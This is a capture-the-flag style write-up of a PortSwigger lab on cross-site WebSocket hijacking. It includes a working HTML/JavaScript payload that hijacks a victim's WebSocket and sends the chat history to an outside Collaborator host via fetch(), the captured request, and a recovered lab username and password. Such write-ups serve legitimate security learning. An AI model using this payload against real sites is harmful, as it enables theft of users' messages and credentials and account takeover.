---
title: Cross-site WebSocket hijacking
description: PortSwigger WebSocket Lab
---
This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

## Discovery
Cookie has flag `SameSite` None:
![](../../../../public/images/PS_WebSocket_20250612%20_140352.png)

WebSocket URL

![](../../../../public/images/PS_WebSocket_20250612%20_135103.png)

## Exploit
![](../../../../public/images/PS_WebSocket_20250612%20_135733.png)

Body:
```html
<script>
	const ws = new WebSocket('wss://0a8900fb031399ca80a4bcd1000d00d7.web-security-academy.net/chat');
	
	ws.onopen = () => {ws.send("READY");};

	ws.onmessage = (event) =>{
			fetch('https://ji5wquk74q1phgmguczhiy0wrnxel49t.oastify.com?msg=' + btoa(event.data));
  };
</script>
```

Request to Collaborator
```http
GET /?msg=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgamdmbzNraWUxZ2Vta2NtaHcwMDMifQ== HTTP/1.1
Host: ji5wquk74q1phgmguczhiy0wrnxel49t.oastify.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: */*
Origin: https://exploit-0a9a00ab033f996c80a1bb4a01c400ac.exploit-server.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://exploit-0a9a00ab033f996c80a1bb4a01c400ac.exploit-server.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9

```

Base64: `eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgamdmbzNraWUxZ2Vta2NtaHcwMDMifQ==`

Decoded:
```json
{
	"user":"Hal Pline",
	"content":"No problem carlos, it&apos;s jgfo3kie1gemkcmhw003"
}
```

### User
`carlos:jgfo3kie1gemkcmhw003`